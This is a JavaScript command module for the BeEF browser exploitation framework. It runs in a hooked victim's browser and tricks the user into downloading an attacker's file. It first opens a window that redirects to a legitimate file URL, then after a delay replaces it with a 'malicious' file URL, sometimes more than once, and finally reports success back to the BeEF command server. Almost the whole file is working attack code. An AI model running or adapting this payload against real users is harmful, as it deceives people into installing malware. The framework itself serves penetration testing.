//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {	
	var maliciousurl = '<%= @malicious_file_uri %>';
	var realurl = '<%= @real_file_uri %>';	
	var w;
	var once = '<%= @do_once %>';

	function doit() {

		if (navigator.userAgent.indexOf('MSIE') == -1){
			w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=' + realurl + '">', 'foo');

			setTimeout(donext, 4500);

		}
	}
	function donext() {
		window.open(maliciousurl, 'foo');
		if (once != true) setTimeout(donext, 5000);
		once = true;
	}
	doit();
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Command executed");
});
